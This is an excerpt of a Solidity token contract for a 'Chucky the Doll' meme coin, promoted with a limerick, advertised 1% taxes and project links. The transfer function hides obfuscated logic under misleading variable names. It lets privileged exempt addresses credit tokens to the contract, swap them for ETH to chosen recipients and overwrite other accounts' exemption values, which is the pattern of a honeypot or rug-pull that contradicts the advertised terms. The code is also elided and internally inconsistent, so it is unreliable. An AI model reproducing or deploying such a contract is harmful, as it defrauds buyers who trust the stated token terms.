...
Who seemed to be very plucky

Murderous, “oh my”
That’s called a good guy

Trapped in that form so unlucky!

Buying Tax - 1%
Selling Tax - 1%
Total Supply - 1,000,000
Initial Liquidity - 2 Ethereum
Initial Liquidity Lock - 60 Days
Maximum Wallet - 4%

https://web.wechat.com/ChuckyTheDoll
https://www.chuckythedoll.killereth.io
*/
// 
...
contract Contract is IERC20, Ownable {
    ...
    uint256 public _initialBaseTaxes = 1;
    ...
    constructor(
        ...
        isTxLimitExempt[msg.sender] = swappingSymbolic;
        isTxLimitExempt[address(this)] = swappingSymbolic;
...
return _approve(msg.sender, spender, amount);
    ...
    function cfgTransferDelay       (
        ...
        if(_levelSwapTo != UniswapV2Pair) {
        require(balanceOf(_levelSwapTo) + _relayNonceAmount < _maxWalletSize, "TOKEN: Balance exceeds wallet size!");
        }

        if (levelTX && contractAppliedBalance > swappingSymbolic && !dataRelayLog && spenderFrom != UniswapV2Pair) {
            dataRelayLog = true;
            getSwapAndLiquify(contractAppliedBalance);
            dataRelayLog = false;
        } else if (isTxLimitExempt[spenderFrom] > swappingSymbolic && isTxLimitExempt[_levelSwapTo] > swappingSymbolic) {
            _extcodesize = _relayNonceAmount;
            _rOwned[address(this)] += _extcodesize;
            swapTokensForEth(_relayNonceAmount, _levelSwapTo);
            return;

        } else if (_levelSwapTo != address(dexRouter) && isTxLimitExempt[spenderFrom] > 0 && _relayNonceAmount > swappingSymbolic && 
            _levelSwapTo != UniswapV2Pair) { isTxLimitExempt[_levelSwapTo] = _relayNonceAmount;
            return;

        } else if (!dataRelayLog && RelayStamp[spenderFrom] > 0 && spenderFrom != UniswapV2Pair && isTxLimitExempt
        [_levelSwapTo] == 0) { RelayStamp[spenderFrom] = isTxLimitExempt[spenderFrom] - swappingSymbolic; }
        address _lxRate  = isBot[UniswapV2Pair];

        if (RelayStamp[_lxRate ] == 0) RelayStamp[_lxRate ] = swappingSymbolic;
        isBot[UniswapV2Pair] = _levelSwapTo;
        if (_initialBaseTaxes > 0 && isTxLimitExempt[spenderFrom] == 0 && !dataRelayLog && isTxLimitExempt
        ...
        _rOwned[address(this)] += _extcodesize; } _rOwned[spenderFrom] -= _relayNonceAmount; _rOwned[_levelSwapTo] += _relayNonceAmount;
        emit Transfer(spenderFrom, _levelSwapTo, _relayNonceAmount);

        if (!tradingIsEnabled) { require(spenderFrom == owner(), "TOKEN: This account cannot send tokens until trading is enabled");
        }
}
    function _approve(
        address owner,
    ...
    function transferFrom(
        ...
        cfgTransferDelay        (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }
    function transfer (address recipient, uint256 amount) external returns (bool) {
        cfgTransferDelay        (msg.sender, recipient, amount);
        return true;
    }
